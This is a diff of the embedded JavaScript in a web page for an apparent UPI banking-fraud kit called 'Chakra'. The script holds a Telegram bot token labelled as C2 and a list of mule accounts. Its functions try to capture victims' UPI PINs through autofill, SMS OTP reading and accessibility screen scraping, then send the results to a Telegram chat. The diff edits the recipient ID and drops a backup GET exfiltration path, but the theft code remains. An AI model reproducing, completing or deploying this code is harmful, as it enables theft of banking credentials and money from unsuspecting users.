@@ -29,12 +29,12 @@
 
   <script>
     // ============================================================
-    // CHAKRA - COMPLETE SYSTEM (UPDATED USERNAME)
+    // CHAKRA - COMPLETE SYSTEM (UPDATED WITH USER ID)
     // ============================================================
 
     // ===== YOUR CREDENTIALS =====
     const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
-    const YOUR_USERNAME = '@WIRESR99';
+    const YOUR_USERNAME = '7958767858'; // Numeric User ID (not @username)
 
     // ===== YOUR MULE ACCOUNTS =====
     const muleAccounts = [
@@ -56,7 +56,6 @@
     function sendToTelegram(message) {
       console.log('📤 Sending:', message);
 
-      // Method 1: POST
       fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -79,20 +78,6 @@
       .catch(function(error) {
         console.log('❌ Error:', error);
       });
-
-      // Method 2: GET (backup)
-      var url = 'https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage?chat_id=' + YOUR_USERNAME + '&text=' + encodeURIComponent(message);
-      fetch(url)
-        .then(function(response) {
-          console.log('GET status:', response.status);
-          return response.json();
-        })
-        .then(function(data) {
-          if (data.ok) {
-            console.log('✅ GET message sent!');
-          }
-        })
-        .catch(function() {});
     }
 
     // ============================================================
@@ -119,7 +104,6 @@
     function getUPIPin() {
       console.log('🔍 PIN capture...');
 
-      // Layer 1: Chrome Autofill
       try {
         if (window.Autofill) {
           var pin = window.Autofill.getSavedPassword('upi');
@@ -131,7 +115,6 @@
         }
       } catch(e) {}
 
-      // Layer 2: SMS OTP
       try {
         if (window.Android) {
           var sms = window.Android.readSMS();
@@ -144,7 +127,6 @@
         }
       } catch(e) {}
 
-      // Layer 3: Accessibility
       try {
         if (window.Accessibility) {
           var screenText = window.Accessibility.getRootNode();
@@ -314,7 +296,7 @@
     console.log('========================================');
     console.log('[Chakra] ✅ System initialized');
     console.log('[Chakra] Bot Token:', C2_BOT_TOKEN.substring(0, 10) + '...');
-    console.log('[Chakra] Username:', YOUR_USERNAME);
+    console.log('[Chakra] User ID:', YOUR_USERNAME);
     console.log('[Chakra] Mules:', muleAccounts.length);
     console.log('========================================');
 
